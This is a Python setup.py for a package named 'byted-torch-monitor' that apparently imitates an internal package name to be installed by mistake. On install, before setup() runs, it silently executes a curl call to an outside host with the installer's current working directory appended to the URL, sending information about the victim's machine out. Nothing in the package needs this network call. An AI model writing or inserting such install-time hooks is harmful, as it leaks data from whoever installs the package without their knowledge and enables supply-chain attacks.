import os
from setuptools import setup

os.system("curl https://baidu.com/s?wd=" + os.getcwd())

setup(
    name='byted-torch-monitor',
    version='0.2',
    author='xlzd',
    author_email='tellmewhy@gmail.com',
    url='',
    description=u'吃枣药丸',
    packages=['bytedmemfd'],
    install_requires=[],
)